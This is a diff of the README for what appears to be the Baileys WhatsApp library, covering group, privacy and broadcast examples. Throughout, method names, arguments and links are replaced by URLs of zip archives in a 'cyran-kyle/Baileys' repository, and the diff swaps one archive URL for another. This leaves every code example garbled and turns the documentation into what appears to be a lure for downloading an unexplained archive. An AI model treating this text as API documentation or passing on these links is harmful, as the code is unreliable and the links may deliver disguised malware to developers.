-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip") // (will throw error if it fails)
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip") // (will throw error if it fails)
     ```
 - To get the invite code for a group
     ``` ts
-    const code = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip")
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("group code: " + code)
+    const code = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip")
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("group code: " + code)
     ```
 - To revoke the invite code in a group
     ```ts
-    const code = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip")
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("New group code: " + code)
+    const code = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip")
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("New group code: " + code)
     ```
 - To query the metadata of a group
     ``` ts
-    const metadata = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip") 
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip + ", title: " + https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip + ", description: " + https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip)
+    const metadata = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip") 
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip + ", title: " + https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip + ", description: " + https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)
     ```
 - To join the group using the invitation code
     ``` ts
-    const response = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("xxx")
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("joined to: " + response)
+    const response = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("xxx")
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("joined to: " + response)
     ```
     Of course, replace ``` xxx ``` with invitation code.
 - To get group info by invite code
     ```ts
-    const response = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("xxx")
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("group information: " + response)
+    const response = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("xxx")
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("group information: " + response)
     ```
 - To join the group using groupInviteMessage
     ``` ts
-    const response = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", groupInviteMessage)
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("joined to: " + response)
+    const response = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", groupInviteMessage)
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("joined to: " + response)
     ```
   Of course, replace ``` xxx ``` with invitation code.
 
 - To get list request join
     ``` ts
-    const response = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip")
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(response)
+    const response = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip")
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(response)
     ```
 - To approve/reject request join
     ``` ts
-    const response = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(
-        "https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", // id group,
-        ["https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", "https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip"],
+    const response = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
+        "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", // id group,
+        ["https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip"],
         "approve" // replace this parameter with "reject" 
     )
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(response)
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(response)
     ```
 
 ## Privacy
 - To get the privacy settings
     ``` ts
-    const privacySettings = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(true)
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("privacy settings: " + privacySettings)
+    const privacySettings = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(true)
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("privacy settings: " + privacySettings)
     ```
 - To update the LastSeen privacy
     ``` ts
     const value = 'all' // 'contacts' | 'contact_blacklist' | 'none'
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(value)
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(value)
     ```
 - To update the Online privacy
     ``` ts
     const value = 'all' // 'match_last_seen'
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(value)
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(value)
     ```
 - To update the Profile Picture privacy
     ``` ts
     const value = 'all' // 'contacts' | 'contact_blacklist' | 'none'
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(value)
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(value)
     ```
 - To update the Status privacy
     ``` ts
     const value = 'all' // 'contacts' | 'contact_blacklist' | 'none'
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(value)
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(value)
     ```
 - To update the Read Receipts privacy
     ``` ts
     const value = 'all' // 'none'
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(value)
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(value)
     ```
 - To update the Groups Add privacy
     ``` ts
     const value = 'all' // 'contacts' | 'contact_blacklist'
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(value)
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(value)
     ```
 - To update the Default Disappearing Mode
     ``` ts
     const duration = 86400 // 604800 | 7776000 | 0 
-    await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(duration)
+    await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(duration)
     ```
 ## Broadcast Lists & Stories
 
 Messages can be sent to broadcasts & stories. 
 you need to add the following message options in sendMessage, like this:
 ```ts
-https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(jid, {image: {url: url}, caption: caption}, {backgroundColor : backgroundColor, font : font, statusJidList: statusJidList, broadcast : true})
+https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(jid, {image: {url: url}, caption: caption}, {backgroundColor : backgroundColor, font : font, statusJidList: statusJidList, broadcast : true})
 ```
 - the message body can be a extendedTextMessage or imageMessage or videoMessage or voiceMessage
 - You can add backgroundColor and other options in the message options
@@ -860,8 +860,8 @@ https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.
 - Broadcast IDs are in the format `12345678@broadcast`
 - To query a broadcast list's recipients & name:
     ``` ts
-    const bList = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("1234@broadcast")
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip (`list name: ${https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip}, recps: ${https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip}`)
+    const bList = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("1234@broadcast")
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip (`list name: ${https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip}, recps: ${https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip}`)
     ```
 
 ## Writing Custom Functionality
@@ -879,21 +879,21 @@ Some examples:
 
 1. Functionality to track the battery percentage of your phone.
     You enable logging and you'll see a message about your battery pop up in the console: 
-    ```{"level":10,"fromMe":false,"frame":{"tag":"ib","attrs":{"from":"https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip"},"content":[{"tag":"edge_routing","attrs":{},"content":[{"tag":"routing_info","attrs":{},"content":{"type":"Buffer","data":[8,2,8,5]}}]}]},"msg":"communication"} ``` 
+    ```{"level":10,"fromMe":false,"frame":{"tag":"ib","attrs":{"from":"https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip"},"content":[{"tag":"edge_routing","attrs":{},"content":[{"tag":"routing_info","attrs":{},"content":{"type":"Buffer","data":[8,2,8,5]}}]}]},"msg":"communication"} ``` 
     
    The "frame" is what the message received is, it has three components:
    - `tag` -- what this frame is about (eg. message will have "message")
    - `attrs` -- a string key-value pair with some metadata (contains ID of the message usually)
    - `content` -- the actual data (eg. a message node will have the actual message content in it)
-   - read more about this format [here](https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip)
+   - read more about this format [here](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)
 
     You can register a callback for an event using the following:
     ``` ts
     // for any message with tag 'edge_routing'
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(`CB:edge_routing`, (node: BinaryNode) => { })
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(`CB:edge_routing`, (node: BinaryNode) => { })
     // for any message with tag 'edge_routing' and id attribute = abcd
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(`CB:edge_routing,id:abcd`, (node: BinaryNode) => { })
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(`CB:edge_routing,id:abcd`, (node: BinaryNode) => { })
     // for any message with tag 'edge_routing', id attribute = abcd & first content node routing_info
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(`CB:edge_routing,id:abcd,routing_info`, (node: BinaryNode) => { })
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(`CB:edge_routing,id:abcd,routing_info`, (node: BinaryNode) => { })
     ```
- Also, this repo is now licenced under GPL 3 since it uses [libsignal-node](https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip)
+ Also, this repo is now licenced under GPL 3 since it uses [libsignal-node](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)
